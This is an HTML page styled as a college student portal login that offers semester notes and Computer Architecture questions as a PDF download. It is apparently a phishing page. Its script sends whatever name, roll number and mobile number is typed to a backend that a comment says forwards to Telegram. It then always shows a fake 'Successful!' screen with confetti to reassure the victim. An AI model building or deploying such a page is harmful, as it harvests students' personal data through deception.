<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>College Student Portal - Login</title>
    <!-- 3D Confetti Animation Library -->
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #74b9ff, #0984e3); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .login-box { background: white; padding: 40px 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 350px; text-align: center; }
        
        h2 { color: #2d3436; font-size: 24px; margin-bottom: 5px; }
        p { color: #636e72; font-size: 14px; margin-bottom: 25px; }

        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dfe6e9; border-radius: 6px; box-sizing: border-box; font-size: 14px; outline: none; }
        input:focus { border-color: #0984e3; }

        button { width: 100%; padding: 12px; background-color: #0984e3; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 15px; cursor: pointer; margin-top: 15px; }
        button:hover { background-color: #74b9ff; }

        /* Success Download Portal Screen */
        #portal-screen { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: white; z-index: 999; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; box-sizing: border-box; }
        #portal-screen h1 { font-size: 35px; color: #27ae60; margin-bottom: 10px; }
        .download-btn { display: inline-block; padding: 15px 30px; background-color: #e74c3c; color: white; text-decoration: none; border-radius: 8px; font-size: 18px; font-weight: bold; margin-top: 20px; box-shadow: 0 4px 15px rgba(231, 76, 60, 0.4); transition: 0.3s; }
        .download-btn:hover { background-color: #c0392b; }
    </style>
</head>
<body>

    <!-- Main College Login Box -->
    <div class="login-box" id="login-container">
        <h2>🎓 Student Portal</h2>
        <p>Login to access Semester Notes & PDF</p>
        
        <form action="/login" method="POST" onsubmit="handleLogin(event, this)">
            <input type="text" name="email" placeholder="Roll No or Name " required>
            <input type="password" name="password" placeholder="Mobile number" required>
            <button type="submit">Student Login</button>
        </form>
    </div>

    <!-- Success & PDF Download Screen (Hidden by default) -->
    <div id="portal-screen">
        <h1>Successful!</h1>
        <p style="font-size: 16px; color: #555;">These are the questions for Computer Architecture. Click below to download the PDF.
</p>
        
        <!-- PDF Download Link -->
        <a href="/download-pdf" class="download-btn" download="College_Notes.pdf">📥 Download Study PDF (Notes)</a>
        
        
    </div>

    <script>
        function handleLogin(event, form) {
            event.preventDefault(); // Page reload hone rokhne

            // Data backend kade (Telegram var) pathvnyasathi fetch API vaparne
            let formData = new FormData(form);
            fetch('/login', { method: 'POST', body: formData });

            // Login box lapvne ani Portal screen dakhavne
            document.getElementById('login-container').style.display = 'none';
            document.getElementById('portal-screen').style.display = 'flex';

            // 3D Confetti Celebration Animation
            var duration = 3 * 1000;
            var end = Date.now() + duration;

            (function frame() {
                confetti({ particleCount: 7, angle: 60, spread: 55, origin: { x: 0 } });
                confetti({ particleCount: 7, angle: 120, spread: 55, origin: { x: 1 } });
                if (Date.now() < end) { requestAnimationFrame(frame); }
            }());
        }
    </script>

</body>
</html>
